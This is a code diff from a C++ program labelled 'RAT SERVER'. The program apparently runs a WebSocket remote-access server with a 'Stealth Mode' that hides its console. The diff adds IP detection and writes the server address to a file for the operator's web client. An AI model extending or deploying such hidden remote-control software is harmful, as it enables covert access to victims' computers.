@@ -8,9 +8,10 @@
 
 // Tắt cảnh báo biên dịch không cần thiết
 #pragma warning(push)
-#pragma warning(disable : 4267) 
-#pragma warning(disable : 4244) 
-#pragma warning(disable : 4996) 
+#pragma warning(disable : 4267) // Tắt cảnh báo size_t to int
+#pragma warning(disable : 4244) // Tắt cảnh báo mất dữ liệu số
+#pragma warning(disable : 4996) // Tắt cảnh báo deprecated
+#pragma warning(disable : 26812) // Tắt cảnh báo enum class 
 
 // --- HÀM XỬ LÝ SỰ KIỆN NHẬN TIN NHẮN TỪ CLIENT ---
 void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr msg) {
@@ -220,6 +221,17 @@ int main() {
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
+    std::string myIP = GetLocalIPAddress();
+    std::cout << ">>> DETECTED LAN IP: " << myIP << std::endl;
+    // Ghi ra file để xem(vì Stealth Mode sẽ ẩn console)
+    std::ofstream ipFile("server_ip.txt");
+    if (ipFile.is_open()) {
+        ipFile << "Server IP Address: " << myIP << "\n";
+        ipFile << "Port: 9002\n";
+        ipFile << "Copy IP nay va nhap vao Web Client.";
+        ipFile.close();
+    }
 
     std::cout << "==========================================" << std::endl;
     std::cout << "   RAT SERVER                             " << std::endl;
